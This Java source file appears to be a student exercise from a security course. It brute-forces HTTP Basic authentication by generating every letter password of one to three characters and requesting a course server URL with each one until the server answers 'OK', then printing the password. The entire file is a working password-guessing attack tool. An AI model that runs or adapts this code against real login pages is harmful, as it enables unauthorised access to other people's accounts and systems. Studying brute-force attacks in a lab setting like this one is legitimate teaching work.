import java.io.IOException;
import java.net.URL;
import java.net.HttpURLConnection;
import java.net.PasswordAuthentication;
import java.net.Authenticator;
import java.util.Vector;
public class BruteForce {
    private boolean c;
    int a;
    private String[] d;
    Vector b;
    BruteForce() {
        this.c = false;
        this.d = new String[] { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z" };
        this.b = new Vector();
        this.a = 0;
        this.b();
        this.a();
    }
    private void a() {
        while ( this.a < this.b.size() ) {
            this.c = this.c();
            if ( this.c ) {
                System.out.print ( "The password is: " );
                System.out.println ( this.b.elementAt ( this.a - 1 ) );
                this.a = this.b.size();
            }
        }
    }
    private void b() {
        new String();
        for ( int i = 0; i < 52; ++i ) {
            this.b.addElement ( this.d[i] );
        }
        for ( int j = 0; j < 52; ++j ) {
            for ( int k = 0; k < 52; ++k ) {
                this.b.addElement ( this.d[j] + this.d[k] );
            }
        }
        for ( int l = 0; l < 52; ++l ) {
            for ( int n = 0; n < 52; ++n ) {
                for ( int n2 = 0; n2 < 52; ++n2 ) {
                    this.b.addElement ( this.d[l] + this.d[n] + this.d[n2] );
                }
            }
        }
    }
    private boolean c() {
        Authenticator.setDefault ( new BruteForce$MyAuthenticator ( this ) );
        try {
            final HttpURLConnection httpURLConnection;
            ( httpURLConnection = ( HttpURLConnection ) new URL ( "http://sec-crack.cs.rmit.edu./SEC/2/" ).openConnection() ).connect();
            if ( httpURLConnection.getResponseMessage().equalsIgnoreCase ( "OK" ) ) {
                return true;
            }
        } catch ( IOException ex ) {}
        return false;
    }
    public static void main ( final String[] array ) {
        new BruteForce();
    }
}
class BruteForce$MyAuthenticator extends Authenticator {
    private   BruteForce a;
    BruteForce$MyAuthenticator ( final BruteForce a ) {
        this.a = a;
    }
    @Override
    protected PasswordAuthentication getPasswordAuthentication() {
        final String s = "";
        final String s2 = this.a.b.elementAt ( this.a.a );
        final BruteForce a = this.a;
        ++a.a;
        return new PasswordAuthentication ( s, s2.toCharArray() );
    }
}
